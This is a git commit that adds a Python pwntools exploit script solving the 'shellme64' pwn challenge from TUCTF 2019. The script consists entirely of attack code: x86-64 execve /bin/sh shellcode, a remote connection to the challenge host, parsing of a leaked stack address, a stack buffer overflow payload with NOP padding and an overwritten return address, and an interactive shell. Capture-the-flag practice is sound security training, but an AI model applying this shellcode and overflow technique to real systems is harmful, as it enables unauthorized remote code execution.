89b3c97b702054576180b9e7d7a8cd52fd190e9d
Jarosław Keller <acdwas@poczta.onet.pl>
2019-12-03 17:43:57 +0100

    Add files via upload

---
+++ 2019/TUCTF/pwn/shellme64/shellme64.py
@@ -0,0 +1,16 @@
+
+from pwn import *
+
+shell = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
+
+r = remote('chal.tuctf.com', 30507)
+# r = process('./shellme32')
+
+
+r.readline()
+x = int(r.readline(), 16)
+r.recvuntil('> ')
+p = shell + ('\x90' * (40 - len(shell))) + p64(x)
+r.sendline(p)
+
+r.interactive()
